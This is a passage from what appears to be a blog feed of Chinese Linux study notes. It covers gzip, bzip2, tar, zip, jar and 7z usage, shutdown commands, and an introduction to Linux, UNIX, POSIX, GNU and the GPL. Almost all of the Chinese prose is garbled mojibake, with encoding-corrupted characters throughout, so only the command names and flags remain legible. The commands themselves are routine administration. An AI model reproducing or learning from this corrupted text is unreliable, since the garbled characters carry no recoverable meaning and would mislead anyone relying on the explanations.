Sæˆ–&lt;å‹ç¼©å­—å°¾å­—ç¬¦ä¸²&gt;æˆ–----suffix&lt;å‹ç¼©å­—å°¾å­—ç¬¦ä¸²&gt;ï¼šæ›´æ”¹å‹ç¼©å­—å°¾å­—ç¬¦ä¸²ï¼›-tæˆ–â€”â€”testï¼šæµ‹è¯•å‹ç¼©æ–‡ä»¶æ˜¯å¦æ­£ç¡®æ— è¯¯ï¼›-væˆ–â€”â€”verboseï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-Væˆ–â€”â€”versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼›-&lt;å‹ç¼©æ•ˆç‡&gt;ï¼šå‹ç¼©æ•ˆç‡æ˜¯ä¸€ä¸ªä»‹äº1~9çš„æ•°å€¼ï¼Œé¢„è®¾å€¼ä¸ºâ€œ6â€ï¼ŒæŒ‡å®šæ„ˆå¤§çš„æ•°å€¼ï¼Œå‹ç¼©æ•ˆç‡å°±ä¼šæ„ˆé«˜ï¼›--bestï¼šæ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®šâ€œ-9â€å‚æ•°ç›¸åŒï¼›--fastï¼šæ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®šâ€œ-1â€å‚æ•°ç›¸åŒã€‚-num ç”¨æŒ‡å®šçš„æ•°å­—numè°ƒæ•´å‹ç¼©çš„é€Ÿåº¦ï¼Œ-1æˆ–--fastè¡¨ç¤ºæœ€å¿«å‹ç¼©æ–¹æ³•ï¼ˆä½å‹ç¼©æ¯”ï¼‰ï¼Œ-9æˆ–--bestè¡¨ç¤ºæœ€æ…¢å‹ç¼©æ–¹æ³•ï¼ˆé«˜å‹ç¼©æ¯”ï¼‰ã€‚ç³»ç»Ÿç¼ºçœå€¼ä¸º6ã€‚ å‚æ•° æ–‡ä»¶åˆ—è¡¨ï¼šæŒ‡å®šè¦å‹ç¼©çš„æ–‡ä»¶åˆ—è¡¨ã€‚ ç¤ºä¾‹ 12345678910111213# æŠŠtest6ç›®å½•ä¸‹çš„æ¯ä¸ªæ–‡ä»¶å‹ç¼©æˆ.gzæ–‡ä»¶gzip *# æŠŠä¸Šä¾‹ä¸­æ¯ä¸ªå‹ç¼©çš„æ–‡ä»¶è§£å‹ï¼Œå¹¶åˆ—å‡ºè¯¦ç»†çš„ä¿¡æ¯gzip -dv *# è¯¦ç»†æ˜¾ç¤ºä¾‹1ä¸­æ¯ä¸ªå‹ç¼©çš„æ–‡ä»¶çš„ä¿¡æ¯ï¼Œå¹¶ä¸è§£å‹gzip -l *# å‹ç¼©ä¸€ä¸ªtarå¤‡ä»½æ–‡ä»¶ï¼Œæ­¤æ—¶å‹ç¼©æ–‡ä»¶çš„æ‰©å±•åä¸º.tar.gzgzip -r log.tar# é€’å½’çš„å‹ç¼©ç›®å½•gzip -rv test6# è¿™æ ·ï¼Œæ‰€æœ‰testä¸‹é¢çš„æ–‡ä»¶éƒ½å˜æˆäº†.gzï¼Œç›®å½•ä¾ç„¶å­˜åœ¨åªæ˜¯ç›®å½•é‡Œé¢çš„æ–‡ä»¶ç›¸åº”å˜æˆäº†.gz.è¿™å°±æ˜¯å‹ç¼©ï¼Œå’Œæ‰“åŒ…ä¸åŒã€‚å› ä¸ºæ˜¯å¯¹ç›®å½•æ“ä½œï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š-ré€‰é¡¹ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å¯¹å­ç›®å½•è¿›è¡Œé€’å½’äº†ã€‚# é€’å½’åœ°è§£å‹ç›®å½•gzip -dr test6 bzipbzip2å‘½ä»¤ ç”¨äºåˆ›å»ºå’Œç®¡ç†ï¼ˆåŒ…æ‹¬è§£å‹ç¼©ï¼‰â€œ.bz2â€æ ¼å¼çš„å‹ç¼©åŒ…ã€‚ è¯­æ³• bzip2 (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ 123456789101112-cæˆ–â€”â€”stdoutï¼šå°†å‹ç¼©ä¸è§£å‹ç¼©çš„ç»“æœé€åˆ°æ ‡å‡†è¾“å‡ºï¼›-dæˆ–â€”â€”decompressï¼šæ‰§è¡Œè§£å‹ç¼©ï¼›-fæˆ–-forceï¼šbzip2åœ¨å‹ç¼©æˆ–è§£å‹ç¼©æ—¶ï¼Œè‹¥è¾“å‡ºæ–‡ä»¶ä¸ç°æœ‰æ–‡ä»¶åŒåï¼Œé¢„è®¾ä¸ä¼šè¦†ç›–ç°æœ‰æ–‡ä»¶ã€‚è‹¥è¦è¦†ç›–ã€‚è¯·ä½¿ç”¨æ­¤å‚æ•°ï¼›-hæˆ–â€”â€”helpï¼šåœ¨çº¿å¸®åŠ©ï¼›-kæˆ–â€”â€”keepï¼šbzip2åœ¨å‹ç¼©æˆ–è§£å‹ç¼©åï¼Œä¼šåˆ é™¤åŸå§‹æ–‡ä»¶ã€‚è‹¥è¦ä¿ç•™åŸå§‹æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨æ­¤å‚æ•°ï¼›-sæˆ–â€”â€”smallï¼šé™ä½ç¨‹åºæ‰§è¡Œæ—¶å†…å­˜çš„ä½¿ç”¨é‡ï¼›-tæˆ–â€”â€”testï¼šæµ‹è¯•.bz2å‹ç¼©æ–‡ä»¶çš„å®Œæ•´æ€§ï¼›-væˆ–â€”â€”verboseï¼šå‹ç¼©æˆ–è§£å‹ç¼©æ–‡ä»¶æ—¶ï¼Œæ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯ï¼›-zæˆ–â€”â€”compressï¼šå¼ºåˆ¶æ‰§è¡Œå‹ç¼©ï¼›-Væˆ–â€”â€”versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼›--repetitive-bestï¼šè‹¥æ–‡ä»¶ä¸­æœ‰é‡å¤å‡ºç°çš„èµ„æ–™æ—¶ï¼Œå¯åˆ©ç”¨æ­¤å‚æ•°æé«˜å‹ç¼©æ•ˆæœï¼›--repetitive-fastï¼šè‹¥æ–‡ä»¶ä¸­æœ‰é‡å¤å‡ºç°çš„èµ„æ–™æ—¶ï¼Œå¯åˆ©ç”¨æ­¤å‚æ•°åŠ å¿«æ‰§è¡Œæ•ˆæœã€‚ å‚æ•° æ–‡ä»¶ï¼šæŒ‡å®šè¦å‹ç¼©çš„æ–‡ä»¶ã€‚ ç¤ºä¾‹ 1234567891011## å‹ç¼©æŒ‡å®šæ–‡ä»¶filename:bzip2 filename æˆ– bzip2 -z filename## è§£å‹æŒ‡å®šçš„æ–‡ä»¶filename.bz2:bzip2 -d filename.bz2 æˆ– bunzip2 filename.bz2# å‹ç¼©è§£å‹çš„æ—¶å€™å°†ç»“æœä¹Ÿè¾“å‡ºï¼šbzip2 -v filename filename: 0.119:1, 67.200 bits/byte, -740.00% saved, 5 in, 42 out.# å‹ç¼©è§£å‹çš„æ—¶å€™ï¼Œé™¤äº†ç”Ÿæˆç»“æœæ–‡ä»¶ï¼Œå°†åŸæ¥çš„æ–‡ä»¶ä¹Ÿä¿å­˜: bzip2 -k filename# è§£å‹åˆ°æ ‡å‡†è¾“å‡º, è¾“å‡ºæ–‡ä»¶çš„å†…å®¹bzip2 -dc filename.bz2 tarLinuxä¸‹çš„å½’æ¡£ä½¿ç”¨å·¥å…·ï¼Œç”¨æ¥æ‰“åŒ…å’Œå¤‡ä»½ã€‚ é¦–å…ˆè¦å¼„æ¸…ä¸¤ä¸ªæ¦‚å¿µï¼šæ‰“åŒ…å’Œå‹ç¼©ã€‚æ‰“åŒ…æ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ï¼›å‹ç¼©åˆ™æ˜¯å°†ä¸€ä¸ªå¤§çš„æ–‡ä»¶é€šè¿‡ä¸€äº›å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinuxä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ å…¶å®æœ€ç®€å•çš„ä½¿ç”¨ tar å°±åªè¦è®°å¿†åº•ä¸‹çš„æ–¹å¼å³å¯ï¼š tar.gz æ ¼å¼: 1234# ä¸€æ¬¡æ€§æ‰“åŒ…å¹¶å‹ç¼©ã€è§£å‹å¹¶è§£åŒ…æ‰“åŒ…å¹¶å‹ç¼©ï¼š tar -zcvf [ç›®æ ‡æ–‡ä»¶å].tar.gz [åŸæ–‡ä»¶å/ç›®å½•å]è§£å‹å¹¶è§£åŒ…ï¼š tar -zxvf [åŸæ–‡ä»¶å].tar.gz -C [ç›®æ ‡ç›®å½•]æ³¨ï¼šzä»£è¡¨ç”¨gzipç®—æ³•æ¥å‹ç¼©/è§£å‹ã€‚ tar.bz2æ ¼å¼: 1234# ä¸€æ¬¡æ€§æ‰“åŒ…å¹¶å‹ç¼©ã€è§£å‹å¹¶è§£åŒ…æ‰“åŒ…å¹¶å‹ç¼©ï¼š tar -jcvf [ç›®æ ‡æ–‡ä»¶å].tar.bz2 [åŸæ–‡ä»¶å/ç›®å½•å]è§£å‹å¹¶è§£åŒ…ï¼š tar -jxvf [åŸæ–‡ä»¶å].tar.bz2æ³¨ï¼šå°å†™jä»£è¡¨ç”¨bzip2ç®—æ³•æ¥å‹ç¼©/è§£å‹ã€‚ å…¶å®ç”¨ä¸åˆ°çš„è¯å°±ä¸ç”¨çœ‹äº†, ä¸‹é¢çš„. è¯­æ³• tar(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ 1234567891011121314151617181920212223-Aæˆ–--catenateï¼šæ–°å¢æ–‡ä»¶åˆ°ä»¥å­˜åœ¨çš„å¤‡ä»½æ–‡ä»¶ï¼›-Bï¼šè®¾ç½®åŒºå—å¤§å°ï¼›-cæˆ–--createï¼šå»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶ï¼›-C &lt;ç›®å½•&gt;ï¼šè¿™ä¸ªé€‰é¡¹ç”¨åœ¨è§£å‹ç¼©ï¼Œè‹¥è¦åœ¨ç‰¹å®šç›®å½•è§£å‹ç¼©ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ã€‚-dï¼šè®°å½•æ–‡ä»¶çš„å·®åˆ«ï¼›-xæˆ–--extractæˆ–--getï¼šä»å¤‡ä»½æ–‡ä»¶ä¸­è¿˜åŸæ–‡ä»¶ï¼›-tæˆ–--listï¼šåˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹ï¼›-zæˆ–--gzipæˆ–--ungzipï¼šé€šè¿‡gzipæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼›-Zæˆ–--compressæˆ–--uncompressï¼šé€šè¿‡compressæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼›-f&lt;å¤‡ä»½æ–‡ä»¶&gt;æˆ–--file=&lt;å¤‡ä»½æ–‡ä»¶&gt;ï¼šæŒ‡å®šå¤‡ä»½æ–‡ä»¶ï¼›-væˆ–--verboseï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-rï¼šæ·»åŠ æ–‡ä»¶åˆ°å·²ç»å‹ç¼©çš„æ–‡ä»¶ï¼›-uï¼šæ·»åŠ æ”¹å˜äº†å’Œç°æœ‰çš„æ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶ï¼›-jï¼šæ”¯æŒbzip2è§£å‹æ–‡ä»¶ï¼›-vï¼šæ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ï¼›-lï¼šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œè®¾ç½®ï¼›-kï¼šä¿ç•™åŸæœ‰æ–‡ä»¶ä¸è¦†ç›–ï¼›-mï¼šä¿ç•™æ–‡ä»¶ä¸è¢«è¦†ç›–ï¼›-wï¼šç¡®è®¤å‹ç¼©æ–‡ä»¶çš„æ­£ç¡®æ€§ï¼›-pæˆ–--same-permissionsï¼šç”¨åŸæ¥çš„æ–‡ä»¶æƒé™è¿˜åŸæ–‡ä»¶ï¼›-Pæˆ–--absolute-namesï¼šæ–‡ä»¶åä½¿ç”¨ç»å¯¹åç§°ï¼Œä¸ç§»é™¤æ–‡ä»¶åç§°å‰çš„â€œ/â€å·ï¼›-N &lt;æ—¥æœŸæ ¼å¼&gt; æˆ– --newer=&lt;æ—¥æœŸæ—¶é—´&gt;ï¼šåªå°†è¾ƒæŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡ä»¶ä¿å­˜åˆ°å¤‡ä»½æ–‡ä»¶é‡Œï¼›--exclude=&lt;èŒƒæœ¬æ ·å¼&gt;ï¼šæ’é™¤ç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶ã€‚ å‚æ•° æ–‡ä»¶æˆ–ç›®å½•ï¼šæŒ‡å®šè¦æ‰“åŒ…çš„æ–‡ä»¶æˆ–ç›®å½•åˆ—è¡¨ã€‚ -f: ä½¿ç”¨æ¡£æ¡ˆåå­—ï¼Œåˆ‡è®°ï¼Œè¿™ä¸ªå‚æ•°æ˜¯æœ€åä¸€ä¸ªå‚æ•°ï¼Œåé¢åªèƒ½æ¥æ¡£æ¡ˆåã€‚ 12345- zï¼šæœ‰gzipå±æ€§çš„- jï¼šæœ‰bz2å±æ€§çš„- Zï¼šæœ‰compresså±æ€§çš„- vï¼šæ˜¾ç¤ºæ‰€æœ‰è¿‡ç¨‹- Oï¼šå°†æ–‡ä»¶è§£å¼€åˆ°æ ‡å‡†è¾“å‡º å®ä¾‹ zipæ ¼å¼ 123å‹ç¼©ï¼š zip -r [ç›®æ ‡æ–‡ä»¶å].zip [åŸæ–‡ä»¶/ç›®å½•å]è§£å‹ï¼š unzip [åŸæ–‡ä»¶å].zipæ³¨ï¼š -rå‚æ•°ä»£è¡¨é€’å½’ taræ ¼å¼ï¼ˆè¯¥æ ¼å¼ä»…ä»…æ‰“åŒ…ï¼Œä¸å‹ç¼©ï¼‰ 123æ‰“åŒ…ï¼štar -cvf [ç›®æ ‡æ–‡ä»¶å].tar [åŸæ–‡ä»¶å/ç›®å½•å]è§£åŒ…ï¼štar -xvf [åŸæ–‡ä»¶å].taræ³¨ï¼šcå‚æ•°ä»£è¡¨createï¼ˆåˆ›å»ºï¼‰ï¼Œxå‚æ•°ä»£è¡¨extractï¼ˆè§£åŒ…ï¼‰ï¼Œvå‚æ•°ä»£è¡¨verboseï¼ˆè¯¦ç»†ä¿¡æ¯ï¼‰ï¼Œfå‚æ•°ä»£è¡¨filenameï¼ˆæ–‡ä»¶åï¼‰ï¼Œæ‰€ä»¥fåå¿…é¡»æ¥æ–‡ä»¶åã€‚ tar.gzæ ¼å¼(æ–¹å¼äºŒå¸¸ç”¨) 12345678# æ–¹å¼ä¸€ï¼šåˆ©ç”¨å‰é¢å·²ç»æ‰“åŒ…å¥½çš„taræ–‡ä»¶ï¼Œç›´æ¥ç”¨å‹ç¼©å‘½ä»¤ã€‚å‹ç¼©ï¼šgzip [åŸæ–‡ä»¶å].tarè§£å‹ï¼šgunzip [åŸæ–‡ä»¶å].tar.gz# æ–¹å¼äºŒï¼šä¸€æ¬¡æ€§æ‰“åŒ…å¹¶å‹ç¼©ã€è§£å‹å¹¶è§£åŒ…æ‰“åŒ…å¹¶å‹ç¼©ï¼š tar -zcvf [ç›®æ ‡æ–‡ä»¶å].tar.gz [åŸæ–‡ä»¶å/ç›®å½•å]è§£å‹å¹¶è§£åŒ…ï¼š tar -zxvf [åŸæ–‡ä»¶å].tar.gzæ³¨ï¼šzä»£è¡¨ç”¨gzipç®—æ³•æ¥å‹ç¼©/è§£å‹ã€‚ tar.bz2æ ¼å¼ 12345678æ–¹å¼ä¸€ï¼šåˆ©ç”¨å·²ç»æ‰“åŒ…å¥½çš„taræ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œå‹ç¼©å‘½ä»¤ï¼šå‹ç¼©ï¼šbzip2 [åŸæ–‡ä»¶å].tarè§£å‹ï¼šbunzip2 [åŸæ–‡ä»¶å].tar.bz2æ–¹å¼äºŒï¼šä¸€æ¬¡æ€§æ‰“åŒ…å¹¶å‹ç¼©ã€è§£å‹å¹¶è§£åŒ…æ‰“åŒ…å¹¶å‹ç¼©ï¼š tar -jcvf [ç›®æ ‡æ–‡ä»¶å].tar.bz2 [åŸæ–‡ä»¶å/ç›®å½•å]è§£å‹å¹¶è§£åŒ…ï¼š tar -jxvf [åŸæ–‡ä»¶å].tar.bz2æ³¨ï¼šå°å†™jä»£è¡¨ç”¨bzip2ç®—æ³•æ¥å‹ç¼©/è§£å‹ã€‚ jaræ ¼å¼ 12345678910å‹ç¼©ï¼šjar -cvf [ç›®æ ‡æ–‡ä»¶å].jar [åŸæ–‡ä»¶å/ç›®å½•å]è§£å‹ï¼šjar -xvf [åŸæ–‡ä»¶å].jar# æ³¨ï¼šå¦‚æœæ˜¯æ‰“åŒ…çš„æ˜¯Javaç±»åº“ï¼Œå¹¶ä¸”è¯¥ç±»åº“ä¸­å­˜åœ¨ä¸»ç±»ï¼Œé‚£ä¹ˆéœ€è¦å†™ä¸€ä¸ªMETA-INF/MANIFEST.MFé…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼šManifest-Version: 1.0Created-By: 1.6.0_27 (Sun Microsystems Inc.)Main-class: the_name_of_the_main_class_should_be_put_here# ç„¶åç”¨å¦‚ä¸‹å‘½ä»¤æ‰“åŒ…ï¼šjar -cvfm [ç›®æ ‡æ–‡ä»¶å].jar META-INF/MANIFEST.MF [åŸæ–‡ä»¶å/ç›®å½•å] è¿™æ ·ä»¥åå°±èƒ½ç”¨â€œjava -jar [æ–‡ä»¶å].jarâ€å‘½ä»¤ç›´æ¥è¿è¡Œä¸»ç±»ä¸­çš„public static void mainæ–¹æ³•äº†ã€‚ 7zæ ¼å¼ 12345å‹ç¼©ï¼š7z a [ç›®æ ‡æ–‡ä»¶å].7z [åŸæ–‡ä»¶å/ç›®å½•å]è§£å‹ï¼š7z x [åŸæ–‡ä»¶å].7zæ³¨ï¼šè¿™ä¸ª7zè§£å‹å‘½ä»¤æ”¯æŒraræ ¼å¼ï¼Œå³ï¼š7z x [åŸæ–‡ä»¶å].rar å…¶å®ƒä¾‹å­ å‚è€ƒç½‘å€ 7. Linuxå¼€å…³æœºå’Œé‡å¯ å¼€æœºï¼šå¼€æœºé”® å…³æœºï¼šshutdownï¼Œhaltï¼Œinit 0ï¼Œpoweroff é‡å¯ï¼šrebootï¼Œinit 6 Shutdownå‘½ä»¤è¯¦è§£ï¼š shutdown -h now ## ç«‹åˆ»å…³æœº shutdown -h +10 ## 10åˆ†é’Ÿä»¥åå…³æœº shutdown -h 12:00:00 ##12ç‚¹æ•´çš„æ—¶å€™å…³æœº]]></content>
      <categories>
        <category>Linux</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå­¦ä¹ ç¬”è®°-1]]></title>
    <url>%2F2018%2F05%2F26%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[1&gt; åˆè¯†Linux1. Linuxä»‹ç»Linuxç³»ç»Ÿæ˜¯ä¸€å¥—å…è´¹ä½¿ç”¨å’Œè‡ªç”±ä¼ æ’­çš„ç±»UNIXæ“ä½œç³»ç»Ÿï¼ˆä¸»è¦ç”¨åœ¨æœåŠ¡å™¨ä¸Šï¼‰ï¼Œæ˜¯ä¸€ä¸ªåŸºäºPOSIXå’ŒUNIXçš„å¤šç”¨æˆ·ã€å¤šä»»åŠ¡ã€æ”¯æŒå¤šçº¿ç¨‹å’Œå¤šCPUçš„æ“ä½œç³»ç»Ÿã€‚å®ƒèƒ½è¿è¡Œä¸»è¦çš„UNIXå·¥å…·è½¯ä»¶ã€åº”ç”¨ç¨‹åºå’Œç½‘ç»œåè®®ã€‚å®ƒæ”¯æŒ32ä½å’Œ64ä½ç¡¬ä»¶ã€‚Linuxç»§æ‰¿äº†UNIXä»¥ç½‘ç»œä¸ºæ ¸å¿ƒçš„è®¾è®¡æ€æƒ³ï¼Œæ˜¯ä¸€ä¸ªæ€§èƒ½ç¨³å®šçš„å¤šç”¨æˆ·ç½‘ç»œæ“ä½œç³»ç»Ÿã€‚ UNIXï¼šæ“ä½œç³»ç»Ÿï¼Œæ˜¯ç¾å›½AT&amp;Tå…¬å¸è´å°”å®éªŒå®¤äº1969å¹´å®Œæˆçš„æ“ä½œç³»ç»Ÿï¼Œæœ€æ—©ç”±è‚¯Â·æ±¤æ™®é€Šï¼ˆKen Thompsonï¼‰ï¼Œä¸¹å°¼æ–¯Â·é‡Œå¥‡ï¼ˆDennis Ritchieï¼‰å¼€å‘ã€‚åœ¨1971å¹´é¦–æ¬¡å¯¹å¤–å‘å¸ƒï¼Œåˆšå¥½åœ¨1971ï¼Œä¸¹å°¼æ–¯Â·é‡Œå¥‡ï¼ˆDennis Ritchieï¼‰å‘æ˜äº†Cè¯­è¨€ï¼Œåæ¥åœ¨1973ï¼ŒUnixè¢«ä»–ç”¨Cè¯­è¨€é‡æ–°ç¼–å†™ã€‚Unixå‰èº«æºè‡ªäºMultiCSï¼Œå«UniCSï¼Œåæ¥æ”¹åå«Unixã€‚ POSIXï¼šå¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼ˆè‹±è¯­ï¼šPortable Operating System Interface of UNIXï¼Œç¼©å†™ä¸ºPOSIXï¼‰ï¼Œæ˜¯IEEEï¼ˆç”µæ°”å’Œç”µå­å·¥ç¨‹å¸ˆåä¼šï¼‰ä¸ºè¦åœ¨å„ç§UNIXæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œè½¯ä»¶ï¼Œè€Œå®šä¹‰APIçš„ä¸€ç³»åˆ—äº’ç›¸å…³è”çš„æ ‡å‡†çš„æ€»ç§°ã€‚ GNUï¼š1983å¹´ï¼ŒRichard Stallmanï¼ˆç†æŸ¥å¾·Â·é©¬ä¿®Â·æ–¯æ‰˜æ›¼ï¼‰åˆ›ç«‹GNUè®¡åˆ’ã€‚ä¸€å¥—å®Œå…¨è‡ªç”±çš„æ“ä½œç³»ç»Ÿï¼Œå…¶å†…å®¹è½¯ä»¶å®Œå…¨ä»¥GPLæ–¹å¼å‘å¸ƒã€‚è¿™ä¸ªæ“ä½œç³»ç»Ÿæ˜¯GNUè®¡åˆ’çš„ä¸»è¦ç›®æ ‡ï¼ˆå‘å±•å‡ºä¸€å¥—å®Œæ•´çš„å¼€æ”¾æºä»£ç æ“ä½œç³»ç»Ÿæ¥å–ä»£Unixï¼‰ï¼Œåç§°æ¥è‡ªGNU\â€™s Not Unix!çš„é€’å½’ç¼©å†™ã€‚ GPLï¼šä¸€ç§GNUé€šç”¨å…¬å…±è®¸å¯åè®®ï¼Œä¸ºä¿è¯GNUè½¯ä»¶å¯ä»¥è‡ªç”±çš„ä½¿ç”¨ã€å¤åˆ¶ã€ä¿®æ”¹å’Œå‘å¸ƒï¼Œæ‰€æœ‰çš„GNUè½¯ä»¶éƒ½æœ‰ä¸€ä»½åœ¨ç¦æ­¢å…¶ä»–äººæ·»åŠ ä»»ä½•é™åˆ¶çš„æƒ…å†µä¸‹æˆæƒæ‰€æœ‰æƒåˆ©ç»™ä»»ä½•äººçš„åè®®æ¡æ¬¾ï¼Œæ˜¯ä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„è‡ªç”±è½¯ä»¶è®¸å¯åè®®æ¡æ¬¾ï¼Œä¿è¯ç»ˆç«¯ç”¨æˆ·è¿è¡Œã€å­¦ä¹ ã€åˆ†äº«ï¼ˆå¤åˆ¶ï¼‰åŠç¼–è¾‘è½¯ä»¶ä¹‹è‡ªç”±ï¼ŒGPLæ˜¯è‡ªç”±è½¯ä»¶å’Œå¼€æºè½¯ä»¶çš„æœ€æµè¡Œè®¸å¯è¯ï¼Œç‰¹è‰²è¡¨ç°ï¼š â€¢å–å¾—è½¯ä»¶ä¸åŸå§‹ç ï¼šæ‚¨å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚æ¥æ‰§è¡Œè¿™ä¸ªè‡ªç”±è½¯ä»¶ â€¢å¤åˆ¶ï¼šæ‚¨å¯ä»¥è‡ªç”±çš„å¤åˆ¶è¯¥è½¯ä»¶ â€¢ä¿®æ”¹ï¼šæ‚¨å¯ä»¥å°†å–å¾—çš„åŸå§‹ç è¿›è¡Œç¨‹åºä¿®æ”¹å·¥ä½œï¼Œä½¿ä¹‹é€‚åˆæ‚¨çš„å·¥ä½œ â€¢å†å‘è¡Œï¼šæ‚¨å¯ä»¥å°†æ‚¨ä¿®æ”¹è¿‡çš„ç¨‹åºï¼Œå†åº¦çš„è‡ªç”±å‘è¡Œï¼Œè€Œä¸ä¼šä¸åŸå…ˆçš„æ’°å†™è€…å†²çª â€¢å›é¦ˆï¼šæ‚¨åº”è¯¥å°†æ‚¨ä¿®æ”¹è¿‡çš„ç¨‹åºä»£ç å›é¦ˆäºç¤¾ç¾¤ ==ä¸åŒè®¸å¯è¯çš„åŒºåˆ«== 1985å¹´ï¼ŒRichard Stallmanåˆåˆ›ç«‹äº†è‡ªç”±è½¯ä»¶åŸºé‡‘ä¼šï¼ˆFree Software Foundationï¼ŒFSFï¼‰æ¥ä¸ºGNUè®¡åˆ’æä¾›æŠ€æœ¯ã€æ³•å¾‹ä»¥åŠè´¢æ”¿æ”¯æŒã€‚ 1990å¹´ï¼ŒGNUè®¡åˆ’å¼€å‘ä¸»è¦é¡¹ç›®æœ‰Emacsï¼ˆæ–‡æœ¬ç¼–è¾‘å™¨ï¼‰ã€GCCï¼ˆGUN Compiler Collectionï¼ŒGNUç¼–è¯‘å™¨é›†åˆï¼‰ã€Bashç­‰ï¼ŒGCCæ˜¯ä¸€å¥—GNUå¼€å‘çš„ç¼–ç¨‹è¯­è¨€ç¼–è¯‘å™¨ã€‚è¿˜æœ‰å¼€å‘ä¸€äº›UNIXç³»ç»Ÿçš„ç¨‹åºåº“å’Œå·¥å…·ã€‚ Linuxæ“ä½œç³»ç»Ÿè¯ç”Ÿäº1991å¹´10æœˆ5æ—¥ï¼ˆè¿™æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼å‘å¤–å…¬å¸ƒæ—¶é—´ï¼‰ï¼Œä¸UNIXå…¼å®¹ï¼Œå¹¶åœ¨GPLæ¡æ¬¾ä¸‹å‘å¸ƒã€‚ç°åœ¨ï¼ŒLinuxäº§ç”Ÿäº†è®¸å¤šä¸åŒçš„Linuxå‘è¡Œç‰ˆæœ¬ï¼Œä½†å®ƒä»¬éƒ½ä½¿ç”¨äº†Linuxå†…æ ¸ã€‚Linuxå¯å®‰è£…åœ¨å„ç§è®¡ç®—æœºç¡¬ä»¶è®¾å¤‡ä¸­ï¼Œæ¯”å¦‚æ‰‹æœºã€å¹³æ¿ç”µè„‘ã€è·¯ç”±å™¨ã€è§†é¢‘æ¸¸æˆæ§åˆ¶å°ã€å°å¼è®¡ç®—æœºã€å¤§å‹æœºå’Œè¶…çº§è®¡ç®—æœºã€‚ 1992å¹´ï¼ŒLinuxä¸å…¶ä»–GUNè½¯ä»¶ç»“åˆï¼Œå®Œå…¨è‡ªç”±çš„GNU/Linuxæ“ä½œç³»ç»Ÿæ­£å¼è¯ç”Ÿï¼Œç®€ç§°Linux ==Linuxçš„åŸºæœ¬æ€æƒ³æœ‰ä¸¤ç‚¹== ç¬¬ä¸€ï¼Œä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶ ç¬¬äºŒï¼Œæ¯ä¸ªè½¯ä»¶éƒ½æœ‰ç¡®å®šçš„ç”¨é€” ä¸Unixæ€æƒ³ååˆ†ç›¸è¿‘ã€‚ 2. Linuxç‰¹ç‚¹1ã€åˆ†æ—¶çš„å¤šç”¨æˆ·ã€å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿ 2ã€å¤šæ•°ç½‘ç»œåè®®æ”¯æŒã€æ–¹ä¾¿çš„è¿œç¨‹ç®¡ç† 3ã€å¼ºå¤§çš„å†…å­˜ç®¡ç†å’Œæ–‡ä»¶ç³»ç»Ÿç®¡ç† 4ã€å¤§é‡çš„å¯ç”¨çš„è½¯ä»¶å’Œå…è´¹çš„è½¯ä»¶ 5ã€ä¼˜è‰¯çš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ 6ã€è‰¯å¥½çš„å¯ç§»æ¤æ€§å’Œçµæ´»æ€§ 7ã€å¯ä¾›é€‰æ‹©çš„å‚å•†å¤š 3. Linuxæ“ä½œç³»ç»Ÿæ¶æ„ è¡¥å……ï¼šlinuxå†…æ ¸å¿…é¡»åŠ 